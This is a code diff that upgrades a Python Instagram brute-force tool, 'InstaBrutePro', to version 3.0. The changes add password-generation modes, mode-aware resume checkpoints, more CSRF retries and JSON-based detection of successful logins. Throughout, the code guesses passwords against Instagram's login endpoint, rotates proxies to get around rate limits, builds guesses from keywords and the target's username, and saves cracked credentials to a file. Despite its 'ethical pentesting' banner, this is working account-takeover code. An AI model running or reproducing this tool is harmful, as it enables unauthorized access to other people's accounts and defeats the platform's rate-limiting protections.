@@ -35,8 +35,8 @@ print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
 print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
 print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
 print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
-print(f"           {Colors.CYAN} InstaBrutePro v2.2 - by Soly {Colors.NC}")
-print(f"{Colors.YELLOW}[*] Ultimate Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
+print(f"           {Colors.CYAN} InstaBrutePro v3.0 - by Soly {Colors.NC}")
+print(f"{Colors.YELLOW}[*] Smartest Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
 print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL (CFAA).{Colors.NC}\n")
 
 # Config
@@ -57,10 +57,10 @@ lock = threading.Lock()
 current_delay = DELAY
 attempts_since_last_proxy_refresh = 0
 
-def save_checkpoint(username, wordlist, line_number):
+def save_checkpoint(username, wordlist, line_number, mode):
     """Save progress to resume later."""
     with open(CHECKPOINT_FILE, 'w') as f:
-        json.dump({'username': username, 'wordlist': wordlist, 'line_number': line_number}, f)
+        json.dump({'username': username, 'wordlist': wordlist, 'line_number': line_number, 'mode': mode}, f)
 
 def load_checkpoint():
     """Load saved progress."""
@@ -96,33 +96,36 @@ def interleave_keywords(keyword1, keyword2):
     result.append(interleaved)
     return result
 
-def generate_variations(keywords, username, max_variations=1000):
-    """Generate password variations with two-keyword combos."""
+def generate_variations(keywords, username, mode, max_variations=1000):
+    """Generate password variations based on mode."""
     variations = set()
     username_parts = [username] + username.split('123')[:1]  # e.g., testuser123 -> testuser
 
-    # Single keywords and leet variations
-    for keyword in keywords:
-        for leet_var in leet_speak(keyword):
-            variations.add(leet_var)
-            for part in username_parts:
-                variations.add(f"{part}{leet_var}")
-                variations.add(f"{leet_var}{part}")
+    if mode in ['two-keyword', 'all']:
+        # Two-keyword combinations
+        for combo in itertools.permutations(keywords, 2):
+            keyword1, keyword2 = combo
+            for leet1 in leet_speak(keyword1):
+                for leet2 in leet_speak(keyword2):
+                    # Direct concatenation
+                    variations.add(f"{leet1}{leet2}")
+                    variations.add(f"{leet2}{leet1}")
+                    # Interleaved
+                    variations.update(interleave_keywords(leet1, leet2))
+                    # Username-based
+                    for part in username_parts:
+                        variations.add(f"{part}{leet1}{leet2}")
+                        variations.add(f"{leet1}{leet2}{part}")
 
-    # Two-keyword combinations
-    for combo in itertools.permutations(keywords, 2):
-        keyword1, keyword2 = combo
-        for leet1 in leet_speak(keyword1):
-            for leet2 in leet_speak(keyword2):
-                # Direct concatenation
-                variations.add(f"{leet1}{leet2}")
-                variations.add(f"{leet2}{leet1}")
-                # Interleaved
-                variations.update(interleave_keywords(leet1, leet2))
-                # Username-based
+    if mode in ['normal', 'all']:
+        # Normal mode: use keywords as full passwords
+        for keyword in keywords:
+            variations.add(keyword)
+            for leet_var in leet_speak(keyword):
+                variations.add(leet_var)
                 for part in username_parts:
-                    variations.add(f"{part}{leet1}{leet2}")
-                    variations.add(f"{leet1}{leet2}{part}")
+                    variations.add(f"{part}{leet_var}")
+                    variations.add(f"{leet_var}{part}")
 
     return list(variations)[:max_variations]
 
@@ -185,7 +188,7 @@ def sort_proxies(proxies):
     return working
 
 def get_csrf(proxies):
-    for _ in range(3):  # Retry 3 times
+    for _ in range(5):  # Retry 5 times
         proxy = random.choice(proxies)
         if not is_valid_proxy(proxy):
             print(f"{Colors.RED}[!] Skipping invalid proxy: {proxy}{Colors.NC}")
@@ -200,6 +203,7 @@ def get_csrf(proxies):
         print(f"{Colors.YELLOW}[*] Fetching CSRF token via {proxy}...{Colors.NC}")
         try:
             resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
+            logging.debug(f"CSRF request response: {resp.text}")
             csrf = resp.cookies.get('csrftoken', '')
             session.close()
             if csrf:
@@ -208,6 +212,7 @@ def get_csrf(proxies):
             print(f"{Colors.RED}[!] No CSRF token - Retrying...{Colors.NC}")
         except requests.RequestException as e:
             print(f"{Colors.RED}[!] CSRF fetch error: {e}{Colors.NC}")
+            logging.debug(f"CSRF fetch error: {str(e)}")
         finally:
             session.close()
     return None
@@ -229,7 +234,7 @@ def try_password(username, password, proxy, csrf):
         'X-IG-App-ID': APP_ID,
         'X-CSRFToken': csrf,
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Accept': '*/*',
+        'Accept': 'application/json',
         'X-Requested-With': 'XMLHttpRequest',
         'Referer': 'https://www.instagram.com/accounts/login/',
     }
@@ -245,10 +250,21 @@ def try_password(username, password, proxy, csrf):
         resp = session.post(LOGIN_URL, data=signed, timeout=10)
         attempts_since_last_proxy_refresh += 1
         time.sleep(current_delay + random.uniform(0, 0.5))
-        # Log response for debugging
-        logging.debug(f"Attempted {username}:{password} via {proxy} - Response: {resp.text}")
-        # Check for successful login
-        if any(x in resp.text for x in ['"authenticated":true', '"status":"ok"', '"user_id"']):
+        # Log full response
+        logging.debug(f"Login attempt for {username}:{password} via {proxy} - Status: {resp.status_code}, Response: {resp.text}")
+        # Parse JSON response
+        try:
+            json_resp = resp.json()
+        except ValueError:
+            logging.debug(f"Invalid JSON response for {password}: {resp.text}")
+            print(f"{Colors.RED}[!] Invalid API response for {password}{Colors.NC}")
+            current_delay = min(current_delay * 2, 2.0)
+            return False
+        # Check for success
+        if (json_resp.get('authenticated') is True or
+            json_resp.get('status') == 'ok' or
+            'logged_in_user' in json_resp or
+            'user_id' in json_resp):
             with lock:
                 print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                 with open('hits/cracked.txt', 'a') as f:
@@ -258,15 +274,16 @@ def try_password(username, password, proxy, csrf):
         elif 'checkpoint_required' in resp.text or 'two_factor_required' in resp.text:
             print(f"{Colors.YELLOW}[!] Checkpoint/2FA on {password} - Manual verify required!{Colors.NC}")
             logging.debug(f"Checkpoint/2FA for {password}: {resp.text}")
-            current_delay = min(current_delay * 2, 2.0)  # Increase delay
+            current_delay = min(current_delay * 2, 2.0)
+            return False
         elif '"spam":true' in resp.text or 'rate_limit' in resp.text:
             print(f"{Colors.RED}[!] Rate limit - Rotating proxy{Colors.NC}")
             current_delay = min(current_delay * 2, 2.0)
             return False
         else:
             print(f"{Colors.CYAN}[-] Fail: {password}{Colors.NC}")
-            current_delay = max(current_delay * 0.9, DELAY)  # Decrease delay if stable
-        return False
+            current_delay = max(current_delay * 0.9, DELAY)
+            return False
     except Exception as e:
         print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
         logging.debug(f"Error for {password}: {str(e)}")
@@ -275,13 +292,13 @@ def try_password(username, password, proxy, csrf):
     finally:
         session.close()
 
-def worker(queue, username, proxies, csrf):
+def worker(queue, username, proxies, csrf, mode):
     global attempts_since_last_proxy_refresh
     while not queue.empty() and not found:
         pw = queue.get()
         proxy = random.choice(proxies)
         try_password(username, pw, proxy, csrf)
-        if attempts_since_last_proxy_refresh > 1000:  # Refresh proxies every 1000 attempts
+        if attempts_since_last_proxy_refresh > 1000:
             print(f"{Colors.YELLOW}[*] Refreshing proxies...{Colors.NC}")
             proxies[:] = refresh_proxies()
             attempts_since_last_proxy_refresh = 0
@@ -289,13 +306,14 @@ def worker(queue, username, proxies, csrf):
 
 def main():
     global resume_line, current_delay
-    parser = argparse.ArgumentParser(description="InstaBrutePro: Ultimate Instagram Brute-Forcer by Soly")
+    parser = argparse.ArgumentParser(description="InstaBrutePro: Smartest Instagram Brute-Forcer by Soly")
     parser.add_argument('-u', required=True, help='Target username')
-    parser.add_argument('-w', default='wordlists/password.txt', help='Keyword list for variations')
+    parser.add_argument('-w', default='wordlists/password.txt', help='Keyword or password list')
     parser.add_argument('-t', type=int, default=THREADS, help='Threads')
     parser.add_argument('-r', action='store_true', help='Resume session')
     parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
     parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
+    parser.add_argument('--mode', choices=['two-keyword', 'normal', 'all'], default='all', help='Mode: two-keyword, normal, or all')
     args = parser.parse_args()
 
     # Validate user
@@ -306,21 +324,26 @@ def main():
         print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
         return
 
-    # Load keywords and generate variations
-    print(f"{Colors.YELLOW}[*] Loading keywords from: {args.w}...{Colors.NC}")
+    # Load keywords/passwords
+    print(f"{Colors.YELLOW}[*] Loading {args.mode} mode from: {args.w}...{Colors.NC}")
     try:
         with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
             keywords = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
-        print(f"{Colors.RED}[!] Keyword list not found: {args.w}{Colors.NC}")
+        print(f"{Colors.RED}[!] File not found: {args.w}{Colors.NC}")
         return
-    words = generate_variations(keywords, args.u)
+
+    # Generate variations based on mode
+    if args.mode == 'normal':
+        words = keywords  # Use passwords as-is
+    else:
+        words = generate_variations(keywords, args.u, args.mode)
     print(f"{Colors.GREEN}[+] Generated {len(words)} password variations{Colors.NC}")
 
     # Load checkpoint
     if args.r:
         checkpoint = load_checkpoint()
-        if checkpoint and checkpoint['username'] == args.u and checkpoint['wordlist'] == args.w:
+        if checkpoint and checkpoint['username'] == args.u and checkpoint['wordlist'] == args.w and checkpoint['mode'] == args.mode:
             resume_line = checkpoint['line_number']
             print(f"{Colors.YELLOW}[*] Resuming from line {resume_line}{Colors.NC}")
             words = words[resume_line:]
@@ -352,12 +375,12 @@ def main():
     queue = Queue()
     for i, word in enumerate(words):
         queue.put(word)
-        if i % 1000 == 0 and i > 0:  # Save checkpoint every 1000 attempts
-            save_checkpoint(args.u, args.w, i)
+        if i % 1000 == 0 and i > 0:
+            save_checkpoint(args.u, args.w, i, args.mode)
 
-    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} with two-keyword combos... Buckle up!{Colors.NC}")
+    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u} in {args.mode} mode... Buckle up!{Colors.NC}")
     with ThreadPoolExecutor(max_workers=args.t) as exec:
-        futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
+        futures = [exec.submit(worker, queue, args.u, proxies, csrf, args.mode) for _ in range(args.t)]
         for future in futures:
             future.result()
 
